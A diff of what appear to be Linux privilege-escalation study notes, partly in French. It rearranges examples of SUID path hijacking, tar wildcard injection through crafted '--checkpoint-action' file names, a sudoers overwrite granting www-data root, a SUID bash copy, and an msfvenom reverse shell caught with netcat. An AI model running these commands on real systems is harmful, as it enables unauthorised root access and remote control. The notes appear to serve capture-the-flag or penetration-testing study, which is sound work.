@@ -38,7 +38,6 @@ looking for the exploit in exploit-db.com or google ...
 
 The  executable is identical to /usr/local/bin/suid-env  
 except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
-***Note that backup script are often scheduled in crontab***
 ```bash
 /bin/bash --version -> verify the version is under 4.2-048
 ```
@@ -48,12 +47,7 @@ export -f /usr/sbin/service
 /usr/local/bin/suid-env2
 ```
 
-other example
-```bash
-echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
-echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
-echo "/var/www/html"  > --checkpoint=1
-```
+
 
 ### ABUSING SHELL FEATURE #2
 (will not work on bash version 4.4 and above)  
@@ -187,12 +181,15 @@ alors elle incluera tous els fichiers selectionnés lors de l'exec.
 Si les noms des fichiers sont des options de commande correct alors   
 on peut executer d'autres fichiers.  
 donc :   
-***quand on cat le fichier on lit blabla tar '*' :**
 ```bash
 cat /usr/local/bin/compress.sh
 ```
+***quand on cat le fichier on lit blabla tar * :***
+
+***Note that backup script are often scheduled in crontab***
+
 REVERSE root SHELL
-on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
+on crée un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.14.34 LPORT=444 -f elf -o shell.elf
 chmod +x /tmp/shell.elf
@@ -202,11 +199,16 @@ on cree des fichiers qui seront executés comme des <flag> de la commande tar
 touch /tmp/--checkpoint=1
 touch /tmp/--checkpoint-action=exec=shell.elf
 ```
-on setup un netcat et on attend
+on setup un netcat et on attend (car c'était un cronjob)
 ```
 nc -nvlp 4444
 ```
-
+##### other example
+```bash
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+```
 #### ROOTBASH
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
